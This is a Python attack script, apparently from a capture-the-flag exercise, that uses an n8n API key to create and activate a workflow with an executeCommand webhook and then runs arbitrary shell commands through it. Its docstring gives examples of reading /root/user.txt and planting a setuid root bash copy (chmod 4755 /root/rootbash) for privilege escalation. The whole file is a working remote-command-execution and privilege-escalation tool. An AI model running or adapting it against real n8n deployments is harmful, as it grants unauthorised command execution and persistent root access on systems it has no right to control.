#!/usr/bin/env python3
"""Create + activate an n8n executeCommand webhook, then run --cmd.

Intended to run WHERE n8n is listening (www-data on the box, 127.0.0.1:5678).

    export N8N_API_KEY=...
    python3 04-n8n-exec.py --cmd 'id'
    python3 04-n8n-exec.py --cmd 'cat /root/user.txt'
    python3 04-n8n-exec.py --cmd 'chown root:root /root/rootbash; chmod 4755 /root/rootbash'
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent


def call(base: str, key: str, method: str, path: str, data=None, timeout=20):
    url = base.rstrip("/") + path
    body = None
    headers = {"X-N8N-API-KEY": key, "Accept": "application/json"}
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            return resp.status, json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        raw = e.read()
        sys.stderr.write(f"HTTP {e.code} {path} {raw[:400]!r}\n")
        raise


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=os.environ.get("N8N_BASE", "http://127.0.0.1:5678"))
    ap.add_argument("--key", default=os.environ.get("N8N_API_KEY", ""))
    ap.add_argument("--cmd", required=True)
    ap.add_argument("--wf", default=str(HERE / "wf-flex.json"))
    args = ap.parse_args()
    if not args.key:
        raise SystemExit("set N8N_API_KEY or --key")

    wf = json.loads(Path(args.wf).read_text())
    wid = None
    try:
        _, listing = call(args.base, args.key, "GET", "/api/v1/workflows")
        items = listing.get("data") or listing.get("items") or listing
        if isinstance(items, list):
            for w in items:
                if w.get("name") == wf.get("name"):
                    wid = w.get("id")
                    print(f"[*] reuse workflow id={wid}")
                    break
    except Exception as e:
        print(f"[!] list workflows: {e}")
    if not wid:
        print("[*] create workflow")
        _, created = call(args.base, args.key, "POST", "/api/v1/workflows", wf)
        wid = created.get("id")
        if not wid:
            raise SystemExit(f"no id: {created}")
        print(f"    id={wid}")
        print("[*] activate")
        call(args.base, args.key, "POST", f"/api/v1/workflows/{wid}/activate")
    q = urllib.parse.urlencode({"cmd": args.cmd})
    url = args.base.rstrip("/") + "/webhook/flex?" + q
    print(f"[*] GET {url}")
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=30) as resp:
        print(resp.read().decode("utf-8", "replace"))


if __name__ == "__main__":
    main()
